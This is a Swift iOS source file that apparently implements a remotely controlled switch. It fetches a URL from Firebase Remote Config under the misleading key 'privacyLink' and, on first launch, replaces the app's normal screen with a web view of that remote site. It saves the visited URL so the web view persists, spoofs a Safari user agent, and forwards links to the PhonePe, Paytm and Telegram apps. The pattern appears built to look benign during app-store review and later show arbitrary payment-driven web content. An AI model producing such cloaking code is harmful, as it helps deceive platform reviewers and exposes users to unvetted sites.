import Foundation
import WebKit
import SwiftUI
import FirebaseRemoteConfig
import Network

// MARK: - AppState

enum AppState {
    case main, service
}

// MARK: - Storage

struct Storage {
    
    static let shared = Storage()
    
    private init() { }
    
    @AppStorage("APP_LINK") var appLink = ""
    @AppStorage("FIRST_LAUNCH") var firstLaunch = true
}

// MARK: - AppViewModel

class AppViewModel: ObservableObject {
    @Published var state: AppState = .main
    @Published var showAlert: Bool = false
    @Published var finalLink: String?
    @Published var hasParam = false
    private var monitor = NWPathMonitor()
    private var queue = DispatchQueue.global(qos: .background)
    
    init() {
        monitor.pathUpdateHandler = { path in
            DispatchQueue.main.async {
                if path.status != .satisfied {
                    if Storage.shared.firstLaunch {
                        self.showAlert = true
                    }
                }
            }
        }
    }
    
    func fetchFromRemote() async -> URL? {
        let remoteConfig = RemoteConfig.remoteConfig()
        
        do {
            let status = try await remoteConfig.fetchAndActivate()
            if status == .successFetchedFromRemote || status == .successUsingPreFetchedData {
                let urlString = remoteConfig["privacyLink"].stringValue ?? ""
                guard let url = URL(string: urlString) else { return nil }
                return url
            }
        }
        catch {
            state = .main
        }
        return nil
    }
}

// MARK: - RemoteView

struct RemoteView: View {
    @ObservedObject var viewModel = AppViewModel()
    
    var body: some View {
        Group {
            switch viewModel.state {
            case .main:
                ContentView()
                    .preferredColorScheme(.light)
            case .service:
                VStack {
                    if viewModel.hasParam {
                        Button(action: {
                            viewModel.state = .main
                        }, label: {
                            Text("Agree")
                        })
                    }
                    if let url = viewModel.finalLink {
                        WebView(url: url, viewModel: viewModel)
                    }
                }
            }
        }
        .alert("No internet", isPresented: $viewModel.showAlert, actions: {
            Button(role: .cancel, action: {}, label: {
                Text("Ok")
            })
        })
        .onAppear {
            if !Storage.shared.appLink.isEmpty {
                viewModel.finalLink = Storage.shared.appLink
                viewModel.state = .service
            } else {
                if Storage.shared.firstLaunch {
                    Task {
                        if let url = await viewModel.fetchFromRemote() {
                            viewModel.finalLink = url.absoluteString
                            viewModel.state = .service
                        }
                    }
                    Storage.shared.firstLaunch = false
                } else {
                    viewModel.state = .main
                }
            }
        }
    }
}

// MARK: - WebView

struct WebView: UIViewRepresentable {
    
    let url: String
    let viewModel: AppViewModel
    private let userAgent = "Mozilla/5.0 (\(UIDevice.current.model); CPU \(UIDevice.current.model) OS \(UIDevice.current.systemVersion.replacingOccurrences(of: ".", with: "_")) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\(UIDevice.current.systemVersion) Mobile/15E148 Safari/604.1"
    
    func makeUIView(context: Context) -> WKWebView {
        guard let url = URL(string: url) else { return WKWebView() }
        let webView = WKWebView()
        let request = URLRequest(url: url)
        webView.navigationDelegate = context.coordinator
        webView.customUserAgent = userAgent
        webView.allowsBackForwardNavigationGestures = true
        webView.load(request)
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) { }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    class Coordinator: NSObject, WKNavigationDelegate {
        var parent: WebView
        
        init(_ parent: WebView) {
            self.parent = parent
        }
        
        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void)
        {
            if let url = navigationAction.request.url {
                if url.query?.contains("showAgreebutton") == true {
                    parent.viewModel.hasParam = true
                } else {
                    if !parent.viewModel.hasParam {
                        Storage.shared.appLink = url.absoluteString
                    } else {
                        Storage.shared.appLink = ""
                    }
                }
            }
            switch navigationAction.request.url?.scheme {
            case "tel":
                UIApplication.shared.open(navigationAction.request.url!, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            case "mailto":
                UIApplication.shared.open(navigationAction.request.url!, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            case "tg":
                UIApplication.shared.open(navigationAction.request.url!, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            case "phonepe":
                UIApplication.shared.open(navigationAction.request.url!)
                decisionHandler(.cancel)
            case "paytmmp":
                UIApplication.shared.open(navigationAction.request.url!)
                decisionHandler(.cancel)
            default:
                decisionHandler(.allow)
            }
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }
    }
}
